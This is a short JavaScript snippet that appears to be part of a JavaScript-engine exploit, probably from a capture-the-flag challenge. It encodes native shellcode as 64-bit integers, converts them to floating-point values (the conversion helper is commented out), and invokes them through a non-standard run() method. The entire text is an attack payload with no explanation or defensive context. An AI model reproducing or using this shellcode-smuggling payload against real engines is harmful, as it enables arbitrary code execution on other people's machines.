
// function ToDoubleArray(raw) {
//     let buf = new ArrayBuffer(raw.length * 8);
//     let dataview = new DataView(buf);

//     for (let i = 0; i < raw.length; ++i){
//         dataview.setBigUint64(i * 8, raw[i], true);
//     }

//     const res = new Float64Array(buf);
//     return Array.from(res);
// }

// var shellcode = [
//     2608851925472796776n,
//     7307011539825918209n,
//     5210783956162667311n,
//     7308335460934430648n,
//     3589986723478130798n,
//     5563462937334n
// ];

// shellcode = ToDoubleArray(shellcode);
// shellcode.run();


var shellcode = [
    2.820972645905851e-134,
    3.0758087950517603e+180,
    2.2354425876138794e+40,
    3.68572438550025e+180,
    1.054512194375715e-68,
    2.748715909248e-311
];
shellcode = shellcode;
shellcode.run();